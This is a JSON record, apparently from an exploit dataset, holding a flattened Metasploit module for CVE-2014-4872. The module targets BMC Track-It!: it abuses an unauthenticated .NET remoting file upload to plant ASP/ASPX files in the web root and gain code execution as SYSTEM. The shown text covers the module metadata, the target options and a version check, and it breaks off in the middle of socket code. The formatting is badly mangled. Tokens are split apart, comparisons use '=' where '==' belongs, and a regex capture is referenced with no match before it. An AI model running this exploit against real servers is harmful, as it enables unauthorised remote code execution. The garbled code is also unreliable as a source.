{
    "text": "vul_name : Numara / BMC Track-It ! FileStorageService Arbitrary File Upload ， vul_cve : CVE-2014-4872 ， vul_poc :  ，  # This module requires Metasploit : http/metasploit.com/download ，  # Current source :  ， require 'msf/core' ， class Metasploit3 < Msf : Exploit : Remote ， Rank = ExcellentRanking ， include Msf : Exploit : Remote : HttpClient ， include Msf : Exploit : EXE ， super ( update_info ( info ,  ， 'Name' => 'Numara / BMC Track-It ! FileStorageService Arbitrary File Upload' ,  ， 'Description' => %q{ ， This module exploits an arbitrary file upload vulnerability in Numara / BMC Track-It !  ， v8 to v11.X. ， The application exposes the FileStorageService .NET remoting service on port 9010 ，  ( 9004 for version 8 ) which accepts unauthenticated uploads. This can be abused by ， a malicious user to upload a ASP or ASPX file to the web root leading to arbitrary ， code execution as NETWORK SERVICE or SYSTEM. ， This module has been tested successfully on versions 11.3.0.355 , 10.0.51.135 , 10.0.50.107 ,  ， 10.0.0.143 , 9.0.30.248 and 8.0.2.51. ， } ,  ， 'Author' => ，  [  ， 'Pedro Ribeiro <pedrib [ at ] gmail.com>' # vulnerability discovery and MSF module ，  ]  ,  ， 'License' => MSF_LICENSE ,  ， ' ，  [  ，  [ 'CVE' , '2014-4872' ]  ,  ，  [ 'OSVDB' , '112741' ]  ,  ，  [ 'US-CERT-VU' , '121036' ]  ,  ，  [ 'URL' , ' ]  ,  ，  [ 'URL' , ' ]  ，  ]  ,  ， 'DefaultOptions' => { 'WfsDelay' => 30 } ,  ， 'Platform' => 'win' ,  ， 'Arch' => ARCH_X86 ,  ， 'Targets' => ，  [  ，  [ 'Numara / BMC Track-It ! v9 to v11.X - Windows' , {} ]  ,  ，  ]  ,  ， 'Privileged' => false ,  ， 'DefaultTarget' => 0 ,  ， 'DisclosureDate' => 'Oct 7 2014' ， register_options (  ，  [  ， OptPort.new ( 'RPORT' ,  ，  [ true , 'TrackItWeb application port' , 80 ]  )  ,  ， OptPort.new ( 'RPORT_REMOTING' ,  ，  [ true , '.NET remoting service port' , 9010 ]  )  ,  ， OptInt.new ( 'SLEEP' ,  ，  [ true , 'Seconds to sleep while we wait for ASP ( X ) file to be written' , 15 ]  )  ,  ， OptString.new ( 'TARGETURI' ,  ，  [ true , 'Base path to the TrackItWeb application' , '/TrackItWeb/' ]  )  ，  ]  , self.class )  ， end ， def get_version ， res = send_request_cgi !  ( { ， 'uri' => normalize_uri ( datastore [ 'TARGETURI' ]  )  ,  ， 'method' => 'GET' ， } )  ， version = $ 1.split ( \".\" )  ， end ， end ， def check ， version = get_version ，  ( version [ 0 ] .to_i = 11 and version [ 1 ] .to_i <= 3 ) or ，  ( version [ 0 ] .to_i = 11 and version [ 1 ] .to_i = 3 and version [ 2 ] .to_i = 0 and version [ 3 ] .to_i < 999 )  ， ctx = { 'Msf' => framework , 'MsfExploit' => self } ， sock = Rex : Socket.create_tcp ( { 'PeerHost' => rhost , 'PeerPort' => datastore [ 'RPORT_REMOTING' ]  , 'Context' => ctx } )  ， sock.write ( rand_text_alpha ( rand ( 200 ) + 100 )  ， res = sock.recv ( 1024 ) ",
    "time": "2014.10.21"
}